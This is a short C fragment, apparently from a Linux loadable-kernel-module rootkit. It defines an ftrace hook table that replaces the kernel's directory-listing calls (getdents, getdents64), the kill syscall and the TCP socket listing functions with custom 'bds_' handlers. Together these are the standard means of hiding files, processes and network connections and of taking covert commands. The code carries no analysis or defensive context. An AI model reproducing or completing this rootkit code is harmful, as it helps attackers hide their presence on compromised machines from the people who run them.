/* All hooks now go through ftrace — no direct syscall-table writes. */
static struct ftrace_hook hooks[] = {
	HOOK("__x64_sys_getdents64", bds_getdents64, &orig_getdents64),
	HOOK("__x64_sys_getdents",   bds_getdents,   &orig_getdents),
	HOOK("__x64_sys_kill",       bds_kill,       &orig_kill),
	HOOK("tcp4_seq_show",        bds_tcp4_seq_show, &orig_tcp4_seq_show),
	HOOK("tcp6_seq_show",        bds_tcp6_seq_show, &orig_tcp6_seq_show),
};
